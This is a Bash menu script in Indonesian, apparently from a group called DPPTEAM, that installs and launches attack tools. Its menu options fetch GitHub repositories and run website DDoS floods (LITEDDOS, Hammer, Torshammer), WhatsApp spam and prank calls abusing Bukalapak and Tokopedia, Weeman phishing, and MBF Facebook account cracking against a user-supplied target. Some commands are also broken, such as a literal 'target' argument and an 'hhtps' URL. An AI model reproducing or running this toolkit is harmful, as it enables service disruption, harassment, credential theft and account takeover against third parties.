blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

clear
figlet -f standard "P3T3RS" | lolcat

echo $green"[author  ]:P3T3RSEL"
echo $yellow"[team  ]:DPPTEAM"
echo $white"[contact WA ]:083824545457"
echo $purple"[Thanks To All Member]"
echo $yellow"[DPPTEAM]"
echo $cyan"[Youtube Channel  ]:DPPTEAM"
echo $green"[Special Thanks]:sadam, zCl4y & SG"
echo "[^_^]====================================[^_^]"
echo ""
echo $red"Ini adalah tools buatan m4nk p3t3rs"
echo $white"[Welcome..:::..MAMANK]"
echo $yellow"...jangan begadang mulu cuk..."
echo $green"......inget besok mulung....."
echo ""
echo $purple"....::SILAHKAN DIPILIH::...."
echo "[+]========================================[+]"
echo $red"|  [1] DDOS Website Dengan LITEDDOS"
echo "[+]========================================[+]"
echo $white"|  [2] SPAM WA Bukalapak"
echo "[+]========================================[+]"
echo $yellow"|  [3] PRANK di Telpon TOKOPEDIA"
echo "[+]========================================[+]"
echo $purple"|  [4] PHISING WEEMAN"
echo "[+]========================================[+]"
echo $blue"|  [5] DDOS Website dgn Hammer"
echo "[+]========================================[+]"
echo $white"|  [6] HACK FB MBF"
echo "[+]========================================[+]"
echo $yellow"|  [7] DDOS dengan Torshammer"
echo "[+]========================================[+]"
echo $green"| [0] EXIT"
echo "[+]========================================[+]"
echo ">>>>>"
read -p "=>[pilih nomer]
√°°root@P3t3rs=°>" bro


if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo
toilet -f standard " P3T3RSEL " -F gay
echo
echo "install LITEDDOS"
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo
toilet -f standard " P3T3RSEL " -F gay
echo
echo ""
echo $green"SPAM WA Bukalapak"
sleep 1
apt update
apt upgrade
apt install php
apt install git
git clone https://github.com/siputra12/prank
mv prank $HOME
cd $HOME/prank
read -p "MasukanTarget:" target
read -p "MasukanInput:" input
php wa.php
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo
toilet -f standard " PETERSEL " -F gay
echo
echo ""
echo $yellow"PRANK di Telpon TOKOPEDIA"
sleep 1
apt update
apt upgrade
pkg install php
pkg install git
git clone https://github.com/siputra12/prank
mv prank $HOME
cd $HOME/prank
read -p "MasukanTarget:" target
php wa.php
fi

if [ $bro = 4 ] || [ $bro = 4 ]
then
clear
echo
toilet -f standard " P3T3RSEL " -F gay
echo
echo ""
echo $red"PHISING WEEMAN"
sleep 1
apt update
apt upgrade
apt install python2
apt install git
git clone https://github.com/evait-security/weeman.git
mv weeman $HOME
cd $HOME/weeman
python2 weeman.py
fi

if [ $bro = 5 ] || [ $bro = 5 ]
then
clear
echo
toilet -f standard " P3T3RSEL " -F gay
echo
echo ""
echo $blue"DDOS dgn Hammer"
sleep 1
pkg update
pkg upgrade
pkg install python2
pkg install git
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
python2 hammer.py -s [target] -p 80 -t 135
fi

if [ $bro = 6 ] || [ $bro = 6 ]
then
clear
echo
toilet -f standard " P3T3RSEL " -F gay
echo
echo ""
echo.$green"Hack Fb Mbf"
sleep 1
pkg update
pkg upgrade
pkg install python2
pip2 install mechanize
pkg install git
git clone https://github.com/hnov7/mbf
mv mbf $HOME
cd $HOME/mbf
python2 mbf.py
fi

if [ $bro = 7 ] || [ $bro = 7 ]
then
clear
echo
toilet -f standard " P3T3RSEL " -F gay
echo
echo ""
echo $yellow"installing Torshammer DDOS"
sleep 1
apt update
apt install git
apt install tor
git clone hhtps://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "MasukanTarget:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 0 ] || [ $bro = 0 ]
then
clear
echo
toilet -f standard "P3T3RS"
echo ""
echo $red"cukup segini ya, klo kurang call aja mhank"
echo $white"gunakan dgn baik ya mhank"
echo $yellow"semangat mulung hari ini nya"
echo $green"no mulung no happy mamank"
echo ""
echo "WE ARE THE BIG FAMILY DPP TEAM"
echo $green"KAMI ADA"
echo $green"Dan"
echo $green"ITU NYATA"
exit
fi
